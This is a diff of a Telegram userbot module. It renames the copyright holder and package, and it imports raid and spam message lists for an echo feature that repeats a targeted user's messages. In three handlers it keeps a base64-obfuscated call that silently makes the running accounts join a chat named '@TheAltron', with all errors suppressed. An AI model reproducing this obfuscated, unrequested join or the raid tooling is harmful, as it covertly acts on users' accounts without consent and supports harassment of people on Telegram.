@@ -1,6 +1,6 @@
 #MIT License
 
-#Copyright (c) 2024 ᴋᴜɴᴀʟ [AFK]
+#Copyright (c) 2024 ᴅʜɪʀᴀᴊ [AFK]
 
 #Permission is hereby granted, free of charge, to any person obtaining a copy
 #of this software and associated documentation files (the "Software"), to deal
@@ -26,12 +26,12 @@ from random import choice
 from telethon import events
 from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 from config import X1, X2, X3, X4, X5, X6, X7, X8, X9, X10, SUDO_USERS, OWNER_ID, CMD_HNDLR as hl
-from STORM.data import DEV
-from STORM.data import EMOJI
-from STORM.data import FLIRT
-from STORM.data import GM, GA, GN
-from STORM.data import LOVERAID
-from STORM.data import SRAID
+from FLASH.data import DEV
+from FLASH.data import EMOJI
+from FLASH.data import FLIRT
+from FLASH.data import GM, GA, GN
+from FLASH.data import LOVERAID
+from FLASH.data import SRAID
 
 ECHO = []
 
@@ -60,8 +60,8 @@ async def echo(event):
                 await event.reply("ɴᴏᴘᴇ, ᴛʜɪꜱ ɢᴜʏ ɪꜱ ꜱᴜᴅᴏ ᴜꜱᴇʀ ❌")
             else:
                 try:
-                    KEX = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
-                    await event.client(KEX)
+                    DM = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
+                    await event.client(DM)
                 except BaseException:
                     pass
 
@@ -90,8 +90,8 @@ async def rmecho(event):
     if event.sender_id in SUDO_USERS:
         if event.reply_to_msg_id:
             try:
-                KEX = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
-                await event.client(KEX)
+                DM = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
+                await event.client(DM)
             except BaseException:
                 pass
 
@@ -123,8 +123,8 @@ async def _(e):
     check = f"{e.sender_id}_{e.chat_id}"
     if check in ECHO:
         try:
-            KEX = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
-            await e.client(KEX)
+            DM = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
+            await e.client(DM)
         except BaseException:
             pass
         if e.message.text or e.message.sticker:
